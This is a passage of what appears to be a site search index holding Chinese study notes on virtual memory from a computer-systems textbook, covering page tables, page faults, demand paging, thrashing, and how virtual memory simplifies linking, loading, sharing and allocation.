\u5df2\u7ecf\u88ab\u5206\u914d\u4e86\uff0c\u4f46\u662f\u5f53\u524d\u5e76\u672a\u7f13\u5b58\u5728\u4e3b\u5b58\u4e2d\u3002</p> <p>\u53ef\u4ee5\u770b\u5230\uff0c\u865a\u62df\u5185\u5b58\u5b58\u50a8\u5728\u78c1\u76d8\u4e2d\uff0c\u800c VM \u7cfb\u7edf\u5c06\u4e3b\u5b58\u4f5c\u4e3a\u865a\u62df\u5185\u5b58\u7684\u7f13\u5b58\u3002</p> <p>\u5728\u300a\u5904\u7406\u5668\u5c42\u6b21\u7ed3\u6784\u300b\u7ae0\u8282\uff0c\u66fe\u4ecb\u7ecd\u4e86 SRAM \u548c DRAM\uff0c\u672c\u8282\u4e2d\uff0c\u7b14\u8005\u4f7f\u7528\u672f\u8bed SRAM \u7f13\u5b58\u6765\u8868\u793a\u4f4d\u4e8e CPU \u548c\u4e3b\u5b58\u4e4b\u95f4\u7684 L1\u3001L2 \u548c L3 \u9ad8\u901f\u7f13\u5b58\uff0c\u4f7f\u7528 DRAM \u7f13\u5b58\u6765\u8868\u793a\u865a\u62df\u5185\u5b58\u7cfb\u7edf\u7684\u7f13\u5b58\uff0c\u4e5f\u5c31\u662f\u4e3b\u5b58\uff08\u5728\u4e3b\u5b58\u4e2d\u7f13\u5b58\u865a\u62df\u9875\uff09\u3002</p> <p>\u7531\u4e8e DRAM \u6bd4 SRAM \u7ea6\u6162 10 \u500d\uff0c\u800c\u78c1\u76d8\u6bd4 DRAM \u6162\u7ea6 10w \u500d\uff0c\u56e0\u6b64\uff0cDRAM \u4e0d\u547d\u4e2d\u7684\u4ee3\u4ef7\u8fdc\u5927\u4e8e SRAM \u4e0d\u547d\u4e2d\u3002</p> <p>\u57fa\u4e8e\u6b64\uff0c\u4e3a\u4e86\u5c3d\u53ef\u80fd\u7684\u8ba9 DRAM \u547d\u4e2d\uff0c\u865a\u62df\u9875\u5f80\u5f80\u5f88\u5927\uff084KB~2MB\uff09\uff0c\u800c\u4e14\u4e0d\u547d\u4e2d\u65f6\u7684\u66ff\u6362\u7b56\u7565\u4e5f\u5341\u5206\u91cd\u8981\uff0c\u56e0\u4e3a\u66ff\u6362\u9519\u865a\u62df\u9875\u7684\u4ee3\u4ef7\u4e5f\u5f88\u6602\u8d35\uff01</p> <p>\u4e3a\u4e86\u80fd\u4f7f\u865a\u62df\u5185\u5b58\u7cfb\u7edf\u6210\u529f\u8fd0\u884c\uff0c\u9700\u8981\u89e3\u51b3\u5982\u4e0b\u95ee\u9898\uff1a</p> <ul> <li>\u5982\u4f55\u5224\u5b9a\u4e00\u4e2a\u865a\u62df\u9875\u662f\u5426\u5df2\u7ecf\u7f13\u5b58\u5728 DRAM \u4e2d\uff1f</li> <li>\u82e5\u662f\uff0c\u8fd9\u4e2a\u865a\u62df\u9875\u5b58\u653e\u5728\u54ea\u4e2a\u7269\u7406\u9875\u4e2d\uff1f</li> <li>\u82e5\u4e0d\u662f\uff0c\u8fd9\u4e2a\u865a\u62df\u9875\u5b58\u653e\u5728\u78c1\u76d8\u7684\u90a3\u4e2a\u4f4d\u7f6e\uff1f</li> </ul> <p>\u4e0a\u8ff0\u529f\u80fd\u7531\u8f6f\u786c\u4ef6\u8054\u5408\u63d0\u4f9b\uff0c\u5305\u62ec\u64cd\u4f5c\u7cfb\u7edf\u8f6f\u4ef6\u3001MMU\uff08\u5185\u5b58\u7ba1\u7406\u5355\u5143\uff09\u4e2d\u7684\u5730\u5740\u7ffb\u8bd1\u786c\u4ef6\u548c\u5b58\u653e\u5728\u7269\u7406\u5185\u5b58\uff08\u4e3b\u5b58\uff09\u4e2d\u7684\u53eb\u505a \u9875\u8868 \u7684\u6570\u636e\u7ed3\u6784\u3002</p> <p>\u6bcf\u6b21\u5730\u5740\u7ffb\u8bd1\u786c\u4ef6\u5c06\u4e00\u4e2a\u865a\u62df\u5730\u5740\u8f6c\u6362\u4e3a\u7269\u7406\u5730\u5740\u65f6\uff0c\u90fd\u4f1a\u8bfb\u53d6\u9875\u8868\u3002\u64cd\u4f5c\u7cfb\u7edf\u8d1f\u8d23\u7ef4\u62a4\u9875\u8868\u7684\u5185\u5bb9\uff0c\u4ee5\u53ca\u5728\u78c1\u76d8\u4e0e DRAM \u4e4b\u95f4\u6765\u56de\u4f20\u9001\u9875\u3002</p> <p></p> <p>\u5982\u56fe\u6240\u793a\uff0c\u9875\u8868\u662f\u4e00\u4e2a\u6570\u7ec4\uff0c\u5176\u4e2d\u6bcf\u4e2a\u5143\u7d20\u79f0\u4e3a\u9875\u8868\u6761\u76ee\uff08Page Table Entry, PTE\uff09\uff0c\u800c \u865a\u62df\u5730\u5740\u7a7a\u95f4\u4e2d\u7684\u6bcf\u4e2a\u9875\u5728\u9875\u8868\u4e2d\u4e00\u4e2a\u56fa\u5b9a\u504f\u79fb\u91cf\u5904\u90fd\u6709\u4e00\u4e2a PTE\u3002</p> <p>\u56fe\u4e2d\uff0cPTE \u7531\u6709\u6548\u4f4d\u548c n \u4f4d\u5730\u5740\u5b57\u6bb5\u7ec4\u5408\u800c\u6210\uff08\u540e\u7eed\u5c06\u5bf9 PTE \u8fdb\u884c\u8fdb\u4e00\u6b65\u6269\u5c55\uff09\uff1a</p> <ul> <li>\u6709\u6548\u4f4d\uff1a\u8be5\u865a\u62df\u9875\u662f\u5426\u88ab\u7f13\u5b58\u5728 DRAM \u4e2d</li> <li>\u5730\u5740\u5b57\u6bb5<ul> <li>\u82e5\u6709\u6548\u4f4d\u4e3a 1\uff0c\u5219\u5730\u5740\u5b57\u6bb5\u4e3a\u7269\u7406\u9875\u7684\u8d77\u59cb\u5730\u5740</li> <li>\u82e5\u6709\u6548\u4f4d\u4e3a 0<ul> <li>\u82e5\u4e3a\u7a7a\u5730\u5740\uff0c\u5219\u8868\u793a\u8be5\u865a\u62df\u9875\u8fd8\u672a\u88ab\u5206\u914d</li> <li>\u5426\u5219\uff0c\u5730\u5740\u5b57\u6bb5\u4e3a\u865a\u62df\u9875\u5728\u78c1\u76d8\u4e0a\u7684\u8d77\u59cb\u5730\u5740</li> </ul> </li> </ul> </li> </ul> <p>\u56fe\u4f8b\u4e2d\u4e00\u5171\u6709 8 \u4e2a\u865a\u62df\u9875\u548c 4 \u4e2a\u7269\u7406\u9875\u7684\u7cfb\u7edf\u7684\u9875\u8868\uff1a</p> <ul> <li>\u56db\u4e2a\u865a\u62df\u9875\uff08VP 1\u3001VP 2\u3001VP 4 \u548c VP 7\uff09\u5f53\u524d\u88ab\u7f13\u5b58\u5728 DRAM \u4e2d</li> <li>\u4e24\u4e2a\u9875\uff08VP 0 \u548c VP 5 \uff09\u8fd8\u672a\u88ab\u5206\u914d</li> <li>\u5269\u4e0b\u7684\u4e24\u4e2a\u865a\u62df\u9875\uff08VP 3 \u548c VP 6\uff09\u5df2\u7ecf\u88ab\u5206\u914d\u4e86\uff0c\u4f46\u662f\u5f53\u524d\u8fd8\u672a\u88ab\u7f13\u5b58</li> </ul> <p>\u9875\u547d\u4e2d</p> <p>\u5f53 CPU \u60f3\u8bfb\u53d6\u5305\u542b\u5728\u865a\u62df\u9875 VP2 \u4e2d\u7684\u4e00\u4e2a\u5b57\u65f6\uff0c\u9996\u5148\u5730\u5740\u7ffb\u8bd1\u786c\u4ef6\u5c06\u865a\u62df\u5730\u5740\u4f5c\u4e3a\u4e00\u4e2a\u7d22\u5f15\u6765\u5b9a\u4f4d PTE2\uff0c\u5e76\u4ece\u5185\u5b58\u4e2d\u8bfb\u53d6\u5b83\uff0c\u7531\u4e8e\u56fe\u4e2d\u6709\u6548\u4f4d\u4e3a 1\uff0c\u6b64\u65f6\u5730\u5740\u7ffb\u8bd1\u786c\u4ef6\u77e5\u9053\u865a\u62df\u9875\u5df2\u88ab\u7f13\u5b58\u5728 DRAM \u4e3b\u5b58\u4e2d\uff0c\u6b64\u5904\u7684\u5730\u5740\u5b57\u6bb5\u4e3a\u7269\u7406\u9875\u7684\u8d77\u59cb\u5730\u5740\u3002</p> <p>\u901a\u8fc7 \u7269\u7406\u9875\u7684\u8d77\u59cb\u5730\u5740 + \u5b57\u7684\u9875\u5185\u504f\u79fb\u91cf\uff0c\u5373\u53ef\u5f97\u5230\u8be5\u5b57\u7684\u7269\u7406\u5730\u5740\u3002</p> <p>\u7f3a\u9875</p> <p>DRAM \u7f13\u5b58\u4e0d\u547d\u4e2d\u79f0\u4e3a\u7f3a\u9875\uff08page fault\uff09\u3002</p> <p>\u5f53 CPU \u60f3\u8bfb\u53d6\u5305\u542b\u5728\u865a\u62df\u9875 VP3 \u4e2d\u7684\u4e00\u4e2a\u5b57\u65f6\uff0c\u7c7b\u4f3c\u7684\uff0c\u4ece\u5185\u5b58\u4e2d\u5b9a\u4f4d\u5e76\u8bfb\u53d6 PTE3\uff0c\u53d1\u73b0\u6709\u6548\u4f4d\u4e3a 0\uff0c\u4f46\u5730\u5740\u5b57\u6bb5\u4e0d\u4e3a\u7a7a\uff0c\u63a8\u65ad\u51fa VP3 \u5df2\u5206\u914d\u4f46\u672a\u88ab\u7f13\u5b58\uff0c\u4e8e\u662f \u89e6\u53d1\u7f3a\u9875\u5f02\u5e38\u3002</p> <p>\u7f3a\u9875\u5f02\u5e38\u8c03\u7528\u5185\u6838\u4e2d\u7684\u7f3a\u9875\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\uff0c\u8be5\u7a0b\u5e8f\u4f1a\u9009\u62e9\u4e00\u4e2a\u727a\u7272\u9875\uff0c\u5047\u8bbe\u727a\u7272\u9875\u4e3a VP4\uff0c\u82e5 VP4 \u5df2\u7ecf\u88ab\u4fee\u6539\uff0c\u90a3\u4e48\u5185\u6838\u5c31\u9700\u8981\u5c06\u5b83\u590d\u5236\u56de\u78c1\u76d8\uff0c\u63a5\u7740\u4fee\u6539 VP4 \u5bf9\u5e94\u7684\u9875\u8868\u6761\u76ee\u3002</p> <p></p> <p>\u63a5\u4e0b\u6765\uff0c\u7f3a\u9875\u5f02\u5e38\u7a0b\u5e8f\u5c06\u8ba9\u5185\u6838\u4ece\u78c1\u76d8\u590d\u5236 PV3 \u5230\u5185\u5b58\u4e2d\u7684 PP3\uff0c\u66f4\u65b0 PTE3\uff0c\u968f\u540e\u8fd4\u56de\u3002</p> <p>\u5f53\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\u8fd4\u56de\u65f6\uff0c\u5b83\u4f1a\u91cd\u65b0\u542f\u52a8\u5bfc\u81f4\u7f3a\u9875\u7684\u6307\u4ee4\uff08\u518d\u6b21\u8bfb\u53d6 VP3 \u4e2d\u7684\u5b57\uff09\uff0c\u5982\u56fe\u6240\u793a\uff0c\u6b64\u65f6 VP4 \u5df2\u88ab\u727a\u7272\uff0c\u800c VP3 \u6210\u529f\u7f13\u5b58\u81f3\u4e3b\u5b58 DRAM \u4e2d\uff0c\u540c\u65f6\u9875\u8868\u4e5f\u8fdb\u884c\u4e86\u76f8\u5e94\u4fee\u6539\uff0c\u9875\u9762\u80fd\u6210\u529f\u547d\u4e2d\u3002</p> <p>\u865a\u62df\u5185\u5b58\u7684\u53d1\u660e\u8fdc\u8fdc\u65e9\u4e8e CPU-\u5185\u5b58\u4e4b\u95f4\u5dee\u8ddd\u52a0\u5927\u5f15\u53d1\u4ea7\u751f SRAM \u4e4b\u524d\uff0c\u56e0\u6b64\u865a\u62df\u5185\u5b58\u7cfb\u7edf\u4f7f\u7528\u4e86\u548c SRAM \u7f13\u5b58\u4e0d\u540c\u7684\u672f\u8bed\uff0c\u5373\u4f7f\u4ed6\u4eec\u7684\u8bb8\u591a\u6982\u5ff5\u662f\u76f8\u4f3c\u7684\u3002</p> <p>\u5728\u865a\u62df\u5185\u5b58\u7684\u4e60\u60ef\u8bf4\u6cd5\u4e2d\uff0c\u5757\u88ab\u79f0\u4e3a\u9875\uff0c\u5728\u78c1\u76d8\u548c\u5185\u5b58\u4e4b\u95f4\u4f20\u9001\u9875\u7684\u6d3b\u52a8\u53eb\u505a\u4ea4\u6362\uff08swapping\uff09\u6216\u8005\u9875\u9762\u8c03\u5ea6\uff08paging\uff09\u3002</p> <p>\u6240\u6709\u73b0\u4ee3\u7cfb\u7edf\u5747\u4f7f\u7528 \u6309\u9700\u9875\u9762\u8c03\u5ea6 \u7b56\u7565\uff1a\u9875\u4ece\u78c1\u76d8\u6362\u5165 DRAM \u548c\u4ece DRAM \u6362\u51fa\u78c1\u76d8\uff0c\u4e00\u76f4\u7b49\u5f85\u76f4\u5230\u5f53\u4e0d\u547d\u4e2d\u53d1\u751f\u65f6\u624d\u6362\u5165\u9875\u9762\u3002</p> <p>\u5206\u914d\u9875\u9762</p> <p>\u5f53\u64cd\u4f5c\u7cfb\u7edf\u5206\u914d\u4e00\u4e2a\u65b0\u7684\u865a\u62df\u5185\u5b58\u9875\u65f6\uff08\u4f8b\u5982\u8c03\u7528 malloc\uff09\uff0c\u5047\u8bbe\u5206\u914d VP5\uff0c\u5176\u8fc7\u7a0b\u4e3a\u5728\u78c1\u76d8\u4e0a\u521b\u5efa\u7a7a\u95f4\u5e76\u66f4\u65b0 PTE5\uff0c\u4f7f\u5b83\u6307\u5411\u5728\u78c1\u76d8\u4e0a\u65b0\u521b\u5efa\u7684\u9875\u9762\uff0c\u4f46\u5e76\u4e0d\u66f4\u65b0\u6709\u6548\u4f4d\uff0c\u56e0\u4e3a\u8be5\u865a\u62df\u9875\u672a\u88ab\u8bfb\u53d6\uff0c\u56e0\u6b64\u6ca1\u6709\u7f13\u5b58\u5230\u4e3b\u5b58 DRAM \u4e2d\u3002</p> <p></p> <p>\u5c40\u90e8\u6027</p> <p>\u5c3d\u7ba1\u5728\u6574\u4e2a\u8fd0\u884c\u8fc7\u7a0b\u4e2d\u7a0b\u5e8f\u5f15\u7528\u7684\u4e0d\u540c\u9875\u9762\u7684\u603b\u6570\u53ef\u80fd\u8d85\u51fa\u7269\u7406\u5185\u5b58\u603b\u7684\u5927\u5c0f\uff0c\u4f46\u662f\u5c40\u90e8\u6027\u539f\u5219\u4fdd\u8bc1\u4e86\u5728\u4efb\u610f\u65f6\u523b\uff0c\u7a0b\u5e8f\u5c06\u8d8b\u5411\u4e8e\u5728\u4e00\u4e2a\u8f83\u5c0f\u7684 \u6d3b\u52a8\u9875\u9762\uff08active page\uff09\u96c6\u5408\u4e0a\u5de5\u4f5c\uff0c\u8fd9\u4e2a\u96c6\u5408\u53eb\u505a \u5de5\u4f5c\u96c6\uff08working set\uff09\u6216\u8005 \u5e38\u9a7b\u96c6\u5408\uff08resident set\uff09\u3002\u5728\u521d\u59cb\u5f00\u9500\uff0c\u4e5f\u5c31\u662f\u5c06\u5de5\u4f5c\u96c6\u9875\u9762\u8c03\u5ea6\u5230\u5185\u5b58\u4e2d\u4e4b\u540e\uff0c\u63a5\u4e0b\u6765\u5bf9\u8fd9\u4e2a\u5de5\u4f5c\u96c6\u7684\u5f15\u7528\u5c06\u5bfc\u81f4\u547d\u4e2d\uff0c\u800c\u4e0d\u4f1a\u4ea7\u751f\u989d\u5916\u7684\u78c1\u76d8\u6d41\u91cf\u3002</p> <p>\u53ea\u8981\u6211\u4eec\u7684\u7a0b\u5e8f\u6709\u597d\u7684\u65f6\u95f4\u5c40\u90e8\u6027\uff0c\u865a\u62df\u5185\u5b58\u7cfb\u7edf\u5c31\u80fd\u5de5\u4f5c\u5f97\u76f8\u5f53\u597d\u3002\u4f46\u662f\uff0c\u5f53\u7136\u4e0d\u662f\u6240\u6709\u7684\u7a0b\u5e8f\u90fd\u80fd\u5c55\u73b0\u826f\u597d\u7684\u65f6\u95f4\u5c40\u90e8\u6027\u3002\u5982\u679c\u5de5\u4f5c\u96c6\u7684\u5927\u5c0f\u8d85\u51fa\u4e86\u7269\u7406\u5185\u5b58\u7684\u5927\u5c0f\uff0c\u90a3\u4e48\u7a0b\u5e8f\u5c06\u4ea7\u751f\u4e00\u79cd\u4e0d\u5e78\u7684\u72b6\u6001\uff0c\u53eb\u505a \u6296\u52a8\uff08thrashing\uff09\uff0c\u8fd9\u65f6\u9875\u9762\u5c06\u4e0d\u65ad\u5730\u6362\u8fdb\u6362\u51fa\u3002\u867d\u7136\u865a\u62df\u5185\u5b58\u901a\u5e38\u662f\u6709\u6548\u7684\uff0c\u4f46\u662f\u5982\u679c\u4e00\u4e2a\u7a0b\u5e8f\u6027\u80fd\u6162\u5f97\u50cf\u722c\u4e00\u6837\uff0c\u90a3\u4e48\u806a\u660e\u7684\u7a0b\u5e8f\u5458\u4f1a\u8003\u8651\u662f\u4e0d\u662f\u53d1\u751f\u4e86\u6296\u52a8\u3002</p>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/#32","title":"3.2 \u865a\u62df\u5185\u5b58\u4f5c\u4e3a\u5185\u5b58\u7ba1\u7406\u7684\u5de5\u5177","text":"<p>\u901a\u5e38\u6765\u8bf4\u865a\u62df\u5730\u5740\u7a7a\u95f4\u5f80\u5f80\u6bd4\u7269\u7406\u5730\u5740\u7a7a\u95f4\u5927\u5f97\u591a\uff0c\u6b64\u65f6\u865a\u62df\u5185\u5b58\u5c06 DRAM \u4f5c\u4e3a\u7f13\u5b58\u3002\u4f46\u6709\u8da3\u7684\u662f\uff0c\u4e00\u4e9b\u65e9\u671f\u7684\u7cfb\u7edf\u652f\u6301\u7684\u662f\u4e00\u4e2a\u6bd4\u7269\u7406\u5185\u5b58\u66f4\u5c0f\u7684\u865a\u62df\u5730\u5740\u7a7a\u95f4\u3002\u7136\u540e\uff0c\u865a\u62df\u7a7a\u95f4\u4ecd\u7136\u662f\u4e00\u4e2a\u6709\u7528\u7684\u673a\u5236\uff0c\u56e0\u4e3a\u5b83\u53ef\u4ee5\u5927\u5927\u7b80\u5316\u5185\u5b58\u7ba1\u7406\uff0c\u5e76\u4e14\u63d0\u4f9b\u4e00\u79cd\u81ea\u7136\u7684\u4fdd\u62a4\u5185\u5b58\u7684\u65b9\u6cd5\u3002</p> <p>\u5230\u76ee\u524d\u4e3a\u6b62\uff0c\u6211\u4eec\u90fd\u5047\u8bbe\u6709\u4e00\u4e2a\u5355\u72ec\u7684\u9875\u8868\uff0c\u5c06\u4e00\u4e2a\u865a\u62df\u5730\u5740\u7a7a\u95f4\u6620\u5c04\u5230\u7269\u7406\u5730\u5740\u7a7a\u95f4\u3002\u5b9e\u9645\u4e0a\uff0c\u64cd\u4f5c\u7cfb\u7edf\u4e3a\u6bcf\u4e2a\u8fdb\u7a0b\u63d0\u4f9b\u4e86\u4e00\u4e2a\u72ec\u7acb\u7684\u9875\u8868\uff0c\u56e0\u800c\u4e5f\u5c31\u662f\u4e00\u4e2a\u72ec\u7acb\u7684\u865a\u62df\u5730\u5740\u7a7a\u95f4\u3002</p> <p></p> <p>\u5728\u8fd9\u4e2a\u793a\u4f8b\u4e2d\uff0c\u8fdb\u7a0b i \u7684\u9875\u8868\u5c06 VP 1 \u6620\u5c04\u5230 PP 2\uff0cVP 2 \u6620\u5c04\u5230 PP 7\u3002\u76f8\u4f3c\u5730\uff0c\u8fdb\u7a0b j \u7684\u9875\u8868\u5c06 VP 1 \u6620\u5c04\u5230 PP 7\uff0cVP 2 \u6620\u5c04\u5230 PP 10\u3002\u6ce8\u610f\uff0c\u591a\u4e2a\u865a\u62df\u9875\u9762\u53ef\u4ee5\u6620\u5c04\u5230\u540c\u4e00\u4e2a\u5171\u4eab\u7269\u7406\u9875\u9762\u4e0a\u3002</p> <p>\u6309\u9700\u9875\u9762\u8c03\u5ea6\u548c\u72ec\u7acb\u7684\u865a\u62df\u5730\u5740\u7a7a\u95f4\u7684\u7ed3\u5408\uff0c\u5bf9\u7cfb\u7edf\u4e2d\u5185\u5b58\u7684\u4f7f\u7528\u548c\u7ba1\u7406\u9020\u6210\u4e86\u6df1\u8fdc\u7684\u5f71\u54cd\u3002\u7279\u522b\u5730\uff0cVM \u7b80\u5316\u4e86\u94fe\u63a5\u548c\u52a0\u8f7d\u3001\u4ee3\u7801\u548c\u6570\u636e\u5171\u4eab\uff0c\u4ee5\u53ca\u5e94\u7528\u7a0b\u5e8f\u7684\u5185\u5b58\u5206\u914d\u3002</p> <ul> <li> <p>\u7b80\u5316\u94fe\u63a5\u3002 \u72ec\u7acb\u7684\u5730\u5740\u7a7a\u95f4\u5141\u8bb8\u6bcf\u4e2a\u8fdb\u7a0b\u7684\u5185\u5b58\u6620\u50cf\u4f7f\u7528\u76f8\u540c\u7684\u57fa\u672c\u683c\u5f0f\uff0c\u800c\u4e0d\u7ba1\u4ee3\u7801\u548c\u6570\u636e\u5b9e\u9645\u5b58\u653e\u5728\u7269\u7406\u5185\u5b58\u7684\u4f55\u5904\u3002\u4f8b\u5982\uff0c\u4e00\u4e2a\u7ed9\u5b9a\u7684   Linux \u7cfb\u7edf\u4e0a\u7684\u6bcf\u4e2a\u8fdb\u7a0b\u90fd\u4f7f\u7528\u7c7b\u4f3c\u7684\u5185\u5b58\u683c\u5f0f\u3002\u5bf9\u4e8e 64 \u4f4d\u5730\u5740\u7a7a\u95f4\uff0c\u4ee3\u7801\u6bb5\u603b\u662f\u4ece\u865a\u62df\u5730\u5740 0x400000   \u5f00\u59cb\u3002\u6570\u636e\u6bb5\u8ddf\u5728\u4ee3\u7801\u6bb5\u4e4b\u540e\uff0c\u4e2d\u95f4\u6709\u4e00\u6bb5\u7b26\u5408\u8981\u6c42\u7684\u5bf9\u9f50\u7a7a\u767d\u3002\u6808\u5360\u636e\u7528\u6237\u8fdb\u7a0b\u5730\u5740\u7a7a\u95f4\u6700\u9ad8\u7684\u90e8\u5206\uff0c\u5e76\u5411\u4e0b\u751f\u957f\u3002\u8fd9\u6837\u7684\u4e00\u81f4\u6027\u6781\u5927\u5730\u7b80\u5316\u4e86\u94fe\u63a5\u5668\u7684\u8bbe\u8ba1\u548c\u5b9e\u73b0\uff0c\u5141\u8bb8\u94fe\u63a5\u5668\u751f\u6210\u5b8c\u5168\u94fe\u63a5\u7684\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u8fd9\u4e9b\u53ef\u6267\u884c\u6587\u4ef6\u662f\u72ec\u7acb\u4e8e\u7269\u7406\u5185\u5b58\u4e2d\u4ee3\u7801\u548c\u6570\u636e\u7684\u6700\u7ec8\u4f4d\u7f6e\u7684\u3002</p> </li> <li> <p>\u7b80\u5316\u52a0\u8f7d\u3002 \u865a\u62df\u5185\u5b58\u8fd8\u4f7f\u5f97\u5bb9\u6613\u5411\u5185\u5b58\u4e2d\u52a0\u8f7d\u53ef\u6267\u884c\u6587\u4ef6\u548c\u5171\u4eab\u5bf9\u8c61\u6587\u4ef6\u3002\u8981\u628a\u76ee\u6807\u6587\u4ef6\u4e2d .text \u548c .data \u8282\u52a0\u8f7d\u5230\u4e00\u4e2a\u65b0\u521b\u5efa\u7684\u8fdb\u7a0b\u4e2d\uff0cLinux   \u52a0\u8f7d\u5668\u4e3a\u4ee3\u7801\u548c\u6570\u636e\u6bb5\u5206\u914d\u865a\u62df\u9875\uff0c\u628a\u5b83\u4eec\u6807\u8bb0\u4e3a\u65e0\u6548\u7684\uff08\u5373\u672a\u88ab\u7f13\u5b58\u7684\uff09\uff0c\u5c06\u9875\u8868\u6761\u76ee\u6307\u5411\u76ee\u6807\u6587\u4ef6\u4e2d\u9002\u5f53\u7684\u4f4d\u7f6e\u3002\u6709\u8da3\u7684\u662f\uff0c\u52a0\u8f7d\u5668\u4ece\u4e0d\u4ece\u78c1\u76d8\u5230\u5185\u5b58\u5b9e\u9645\u590d\u5236\u4efb\u4f55\u6570\u636e\u3002\u5728\u6bcf\u4e2a\u9875\u521d\u6b21\u88ab\u5f15\u7528\u65f6\uff0c\u8981\u4e48\u662f   CPU \u53d6\u6307\u4ee4\u65f6\u5f15\u7528\u7684\uff0c\u8981\u4e48\u662f\u4e00\u6761\u6b63\u5728\u6267\u884c\u7684\u6307\u4ee4\u5f15\u7528\u4e00\u4e2a\u5185\u5b58\u4f4d\u7f6e\u65f6\u5f15\u7528\u7684\uff0c\u865a\u62df\u5185\u5b58\u7cfb\u7edf\u4f1a\u6309\u7167\u9700\u8981\u81ea\u52a8\u5730\u8c03\u5165\u6570\u636e\u9875\u3002</p> </li> </ul> <p>\u5c06\u4e00\u7ec4\u8fde\u7eed\u7684\u865a\u62df\u9875\u6620\u5c04\u5230\u4efb\u610f\u4e00\u4e2a\u6587\u4ef6\u4e2d\u7684\u4efb\u610f\u4f4d\u7f6e\u7684\u8868\u793a\u6cd5\u79f0\u4f5c \u5185\u5b58\u6620\u5c04\uff08memory mapping\uff09\u3002Linux \u63d0\u4f9b\u4e00\u4e2a\u79f0\u4e3a mmap   \u7684\u7cfb\u7edf\u8c03\u7528\uff0c\u5141\u8bb8\u5e94\u7528\u7a0b\u5e8f\u81ea\u5df1\u505a\u5185\u5b58\u6620\u5c04\u3002</p> <ul> <li>\u7b80\u5316\u5171\u4eab\u3002 \u72ec\u7acb\u5730\u5740\u7a7a\u95f4\u4e3a\u64cd\u4f5c\u7cfb\u7edf\u63d0\u4f9b\u4e86\u4e00\u4e2a\u7ba1\u7406\u7528\u6237\u8fdb\u7a0b\u548c\u64cd\u4f5c\u7cfb\u7edf\u81ea\u8eab\u4e4b\u95f4\u5171\u4eab\u7684\u4e00\u81f4\u673a\u5236\u3002\u4e00\u822c\u800c\u8a00\uff0c\u6bcf\u4e2a\u8fdb\u7a0b\u90fd\u6709\u81ea\u5df1\u79c1\u6709\u7684\u4ee3\u7801\u3001\u6570\u636e\u3001\u5806\u4ee5\u53ca\u6808\u533a\u57df\uff0c\u662f\u4e0d\u548c\u5176\u4ed6\u8fdb\u7a0b\u5171\u4eab\u7684\u3002\u5728\u8fd9\u79cd\u60c5\u51b5\u4e2d\uff0c\u64cd\u4f5c\u7cfb\u7edf\u521b\u5efa\u9875\u8868\uff0c\u5c06\u76f8\u5e94\u7684\u865a\u62df\u9875\u6620\u5c04\u5230\u4e0d\u8fde\u7eed\u7684\u7269\u7406\u9875\u9762\u3002</li> </ul> <p>\u7136\u800c\uff0c\u5728\u4e00\u4e9b\u60c5\u51b5\u4e2d\uff0c\u8fd8\u662f\u9700\u8981\u8fdb\u7a0b\u6765\u5171\u4eab\u4ee3\u7801\u548c\u6570\u636e\u3002\u4f8b\u5982\uff0c\u6bcf\u4e2a\u8fdb\u7a0b\u5fc5\u987b\u8c03\u7528\u76f8\u540c\u7684\u64cd\u4f5c\u7cfb\u7edf\u5185\u6838\u4ee3\u7801\uff0c\u800c\u6bcf\u4e2a C \u7a0b\u5e8f\u90fd\u4f1a\u8c03\u7528 C \u6807\u51c6\u5e93\u4e2d\u7684\u7a0b\u5e8f\uff0c\u6bd4\u5982 printf\u3002\u64cd\u4f5c\u7cfb\u7edf\u901a\u8fc7\u5c06\u4e0d\u540c\u8fdb\u7a0b\u4e2d\u9002\u5f53\u7684\u865a\u62df\u9875\u9762\u6620\u5c04\u5230\u76f8\u540c\u7684\u7269\u7406\u9875\u9762\uff0c\u4ece\u800c\u5b89\u6392\u591a\u4e2a\u8fdb\u7a0b\u5171\u4eab\u8fd9\u90e8\u5206\u4ee3\u7801\u7684\u4e00\u4e2a\u526f\u672c\uff0c\u800c\u4e0d\u662f\u5728\u6bcf\u4e2a\u8fdb\u7a0b\u4e2d\u90fd\u5305\u62ec\u5355\u72ec\u7684\u5185\u6838\u548c C \u6807\u51c6\u5e93\u7684\u526f\u672c\uff0c\u5982\u4e0a\u56fe\u6240\u793a\u3002</p> <ul> <li>\u7b80\u5316\u5185\u5b58\u5206\u914d\u3002 \u865a\u62df\u5185\u5b58\u4e3a\u5411\u7528\u6237\u8fdb\u7a0b\u63d0\u4f9b\u4e00\u4e2a\u7b80\u5355\u7684\u5206\u914d\u989d\u5916\u5185\u5b58\u7684\u673a\u5236\u3002\u5f53\u4e00\u4e2a\u8fd0\u884c\u5728\u7528\u6237\u8fdb\u7a0b\u4e2d\u7684\u7a0b\u5e8f\u8981\u6c42\u989d\u5916\u7684\u5806\u7a7a\u95f4\u65f6\uff08\u5982\u8c03\u7528   malloc \u7684\u7ed3\u679c\uff09\uff0c\u64cd\u4f5c\u7cfb\u7edf\u5206\u914d\u4e00\u4e2a\u9002\u5f53\u6570\u5b57\uff08\u4f8b\u5982 k\uff09\u4e2a\u8fde\u7eed\u7684\u865a\u62df\u5185\u5b58\u9875\u9762\uff0c\u5e76\u4e14\u5c06\u5b83\u4eec\u6620\u5c04\u5230\u7269\u7406\u5185\u5b58\u4e2d\u4efb\u610f\u4f4d\u7f6e\u7684 k   \u4e2a\u4efb\u610f\u7684\u7269\u7406\u9875\u9762\u3002\u7531\u4e8e\u9875\u8868\u5de5\u4f5c\u7684\u65b9\u5f0f\uff0c\u64cd\u4f5c\u7cfb\u7edf\u6ca1\u6709\u5fc5\u8981\u5206\u914d k \u4e2a\u8fde\u7eed\u7684\u7269\u7406\u5185\u5b58\u9875\u9762\u3002\u9875\u9762\u53ef\u4ee5\u968f\u673a\u5730\u5206\u6563\u5728\u7269\u7406\u5185\u5b58\u4e2d\u3002</li> </ul>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/#33","title":"3.3 